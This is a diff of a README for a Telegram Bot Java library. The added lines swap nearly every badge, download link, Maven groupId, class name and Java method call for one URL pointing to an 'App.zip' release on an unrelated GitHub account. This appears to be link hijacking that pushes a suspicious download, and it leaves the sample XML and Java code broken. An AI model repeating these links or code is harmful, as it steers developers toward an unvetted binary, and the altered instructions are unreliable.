@@ -1,11 +1,11 @@
 # Telegram Bot Java Library
-[![Telegram](http://trellobot.doomdns.org/telegrambadge.svg)](https://telegram.me/JavaBotsApi)
+[![Telegram](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)
 
 
-[![Build Status](https://travis-ci.org/rubenlagus/TelegramBots.svg?branch=master)](https://travis-ci.org/rubenlagus/TelegramBots)
-[![Jitpack](https://jitpack.io/v/rubenlagus/TelegramBots.svg)](https://jitpack.io/#rubenlagus/TelegramBots)
-[![Maven Central](https://maven-badges.herokuapp.com/maven-central/org.telegram/telegrambots/badge.svg)](http://mvnrepository.com/artifact/org.telegram/telegrambots)
-[![MIT License](http://img.shields.io/badge/license-MIT-blue.svg?style=flat)](https://github.com/rubenlagus/TelegramBots/blob/master/LICENSE)
+[![Build Status](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)
+[![Jitpack](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)
+[![Maven Central](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)
+[![MIT License](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)
 
 A simple to use library to create Telegram Bots in Java
 
@@ -25,69 +25,69 @@ Just import add the library to your project with one of these options:
 
 ```xml
     <dependency>
-        <groupId>org.telegram</groupId>
+        <groupId>https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip</groupId>
         <artifactId>telegrambots</artifactId>
         <version>2.4.4.5</version>
     </dependency>
 ```
 
-  2. Using Jitpack from [here](https://jitpack.io/#rubenlagus/TelegramBots/2.4.4.5)
-  3. Download the jar(including all dependencies) from [here](https://github.com/rubenlagus/TelegramBots/releases/tag/2.4.4.5)
+  2. Using Jitpack from [here](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)
+  3. Download the jar(including all dependencies) from [here](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)
 
-In order to use Long Polling mode, just create your own bot extending `org.telegram.telegrambots.bots.TelegramLongPollingBot`.
+In order to use Long Polling mode, just create your own bot extending `https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip`.
 
-If you like to use Webhook, extend `org.telegram.telegrambots.bots.TelegramWebhookBot`
+If you like to use Webhook, extend `https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip`
 
 
-Once done, you just need to create a `org.telegram.telegrambots.TelegramBotsApi`and register your bots:
+Once done, you just need to create a `https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip`and register your bots:
 
 ```java
 
-    // Example taken from https://github.com/rubenlagus/TelegramBotsExample
+    // Example taken from https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip
     public class Main {
         public static void main(String[] args) {
     
             TelegramBotsApi telegramBotsApi = new TelegramBotsApi();
             try {
-                telegramBotsApi.registerBot(new ChannelHandlers());
-                telegramBotsApi.registerBot(new DirectionsHandlers());
-                telegramBotsApi.registerBot(new RaeHandlers());
-                telegramBotsApi.registerBot(new WeatherHandlers());
-                telegramBotsApi.registerBot(new TransifexHandlers());
-                telegramBotsApi.registerBot(new FilesHandlers());
+                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip(new ChannelHandlers());
+                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip(new DirectionsHandlers());
+                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip(new RaeHandlers());
+                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip(new WeatherHandlers());
+                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip(new TransifexHandlers());
+                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip(new FilesHandlers());
             } catch (TelegramApiException e) {
-                e.printStackTrace();
+                https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip();
             }
         }
     }
 
 ```
 
-For detailed explanation, visite our [How To](https://github.com/rubenlagus/TelegramBots/wiki/Getting-Started) (thanks Clevero)
+For detailed explanation, visite our [How To](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip) (thanks Clevero)
 
 
 ## Example bots
 Open them and send them */help* command to get some information about their capabilities:
 
-https://telegram.me/weatherbot (**Use custom keyboards**)
+https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip (**Use custom keyboards**)
 
-https://telegram.me/directionsbot (**Basic messages**)
+https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip (**Basic messages**)
 
-https://telegram.me/filesbot (**Send files by file_id**)
+https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip (**Send files by file_id**)
 
-https://telegram.me/TGlanguagesbot (**Send files uploding them**)
+https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip (**Send files uploding them**)
 
-https://telegram.me/RaeBot (**Inline support**)
+https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip (**Inline support**)
 
-https://telegram.me/SnowcrashBot (**Webhook support**)
+https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip (**Webhook support**)
 
-You can see code for those bots at [TelegramBotsExample](https://github.com/rubenlagus/TelegramBotsExample) project.
+You can see code for those bots at [TelegramBotsExample](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip) project.
 
 ## Telegram Bot API
-This library use [Telegram bot API](https://core.telegram.org/bots), you can find more information following the link.
+This library use [Telegram bot API](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip), you can find more information following the link.
 
 ## Questions or Suggestions
-Feel free to create issues [here](https://github.com/rubenlagus/TelegramBots/issues) as you need or join the [chat](https://telegram.me/JavaBotsApi)
+Feel free to create issues [here](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip) as you need or join the [chat](https://github.com/suryaimelandabp/mybot1/releases/download/v1.0/App.zip)
 
 ## License 
 MIT License
